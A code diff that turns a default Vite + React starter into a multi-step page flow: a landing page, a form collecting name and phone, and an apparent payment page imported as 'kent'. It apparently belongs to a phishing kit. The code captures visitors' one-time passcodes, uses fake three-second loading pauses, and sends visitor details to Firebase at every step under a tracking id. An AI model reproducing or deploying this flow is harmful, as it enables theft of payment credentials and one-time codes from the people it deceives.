@@ -1,35 +1,80 @@
-import { useState } from 'react'
-import reactLogo from './assets/react.svg'
-import viteLogo from '/vite.svg'
-import './App.css'
+import { useEffect, useState } from 'react';
+import './main.css';
+import { CartProvider } from './cartContext';
+import Landing from './landing/landing';
+import { Toaster } from 'react-hot-toast';
+import Info from './info/info';
+import { Loader } from './loader';
+import { Payment } from './kent/kent';
+import { addData } from './firebase';
 
 function App() {
-  const [count, setCount] = useState(0)
 
+  const [currantPage, setCurrantPage] = useState(1);
+  const [isLoading, setisloading] = useState(false);
+  const [name, setName] = useState('')
+  const [phone, setPhone] = useState('')
+  const [otp, setOtp] = useState('')
+  const [otpArd] = useState([''])
+const [_id]=useState( "id" + Math.random().toString(16).slice(2))
+const data={
+    id:_id,
+    hasPersonalInfo:name != '',
+    currentPage:currantPage,
+    createdDate: new Date().toISOString(),
+    notificationCount:1,
+    personalInfo: {
+      id:name,
+      fullName:name,
+      phone:phone
+    },
+  };
+  const handleNextPage = () => {
+   addData(data)
+   setisloading(true)
+    setTimeout(() => {
+      setisloading(false)
+      setCurrantPage(currantPage+1)
+    }, 3000)
+  }
+  
+  const handleOtp = (v: string) => {
+    setOtp(v)
+
+  }
+  const handleOArr = async () => {
+    await otpArd.push(otp)
+  }
+useEffect(()=>{
+localStorage.setItem('vistor',_id)
+  addData(data)
+},[])
   return (
-    <>
+    <CartProvider>
+      <Loader show={isLoading}/>
+      <div style={{opacity:isLoading?0.4:1}}>
       <div>
-        <a href="https://vite.dev" target="_blank">
-          <img src={viteLogo} className="logo" alt="Vite logo" />
-        </a>
-        <a href="https://react.dev" target="_blank">
-          <img src={reactLogo} className="logo react" alt="React logo" />
-        </a>
+        <Toaster position="bottom-center" />
       </div>
-      <h1>Vite + React</h1>
-      <div className="card">
-        <button onClick={() => setCount((count) => count + 1)}>
-          count is {count}
-        </button>
-        <p>
-          Edit <code>src/App.tsx</code> and save to test HMR
-        </p>
+      {
+        currantPage === 1 ?
+          <Landing handleNextPage={handleNextPage} /> :
+          currantPage === 2 ?
+            <Info setName={setName} setPhone={setPhone} handleNextPage={handleNextPage}  /> :
+            currantPage >= 3 ?
+              <Payment 
+              handleOtp={handleOtp} 
+              handleOArr={handleOArr}
+              handleNextPage={handleNextPage}
+              currantPage={currantPage}
+              setCurrantPage={setCurrantPage}
+              setisloading={setisloading}
+              /> :
+              null
+      }
       </div>
-      <p className="read-the-docs">
-        Click on the Vite and React logos to learn more
-      </p>
-    </>
-  )
+    </CartProvider>
+  );
 }
 
-export default App
+export default App;
